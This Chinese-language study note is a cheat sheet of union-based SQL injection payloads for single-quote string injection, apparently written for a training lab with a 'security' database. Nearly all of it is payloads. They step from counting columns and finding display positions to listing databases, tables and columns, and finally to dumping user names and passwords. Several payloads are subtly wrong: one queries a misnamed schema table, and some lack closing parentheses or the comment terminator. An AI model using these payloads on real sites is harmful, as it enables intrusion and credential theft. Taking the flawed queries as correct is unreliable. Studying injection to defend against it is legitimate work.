# 前言
这篇笔记的目的是整理各种 SQL 注入使用时的`payload`。

> 说明：以下的`payloads`都基于单引号字符型注入。若是整型注入则把单引号和注释符（–+）去掉，若是双引号注入则把单引号换成双引号。

也就是基于这样一种情况：
```
SELECT * FROM Student WHERE id = '1';
```
## Payload
1. 判断当前数据表中有几列：

```
?id=1' order by 数值 --+
```
2. 查看显示位在第几列：

```
?id=-1' union select 1,2,3 --+
```
> 注意：这里需要传递一个不存在的条件，比如：`id=-1`

3. 显示当前数据库（假设显示位中包含第三位）：

```
?id=-1' union select 1,2,database() --+
```

4. 查看当前数据库中的所有表：

```
?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()) --+
```
> 函数`group_concat()`把所有结果都在一行输出

5. 查询所有数据库：

```
?id=-1' union select 1,2,(select group_concat(schema_name) from information_schema.schema) --+
```

6. 查询某个数据库中的表：

```
?id=-1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security' --+
```

7. 查询某个表中的所有字段：
```
?id=-1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users' --+
```

8. 查询某个表中的字段内容
```
?id=-1' union select 1,2,(select group_concat(name, 0x3a, passwd) from security.users)
```
> 0x3a会被转义位冒号`：`

### Union
SQL UNION 操作符合并两个或多个 SELECT 语句的结果，需要注意的是：UNION 内部的每个 SELECT 语句必须拥有相同数量的列。

### 参考链接
[Web安全学习之数据库注入语句的收集和学习](https://ca0y1h.top/Web_security/basic_learning/5.%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5%E8%AF%AD%E5%8F%A5%E7%9A%84%E6%94%B6%E9%9B%86%E5%92%8C%E5%AD%A6%E4%B9%A0/)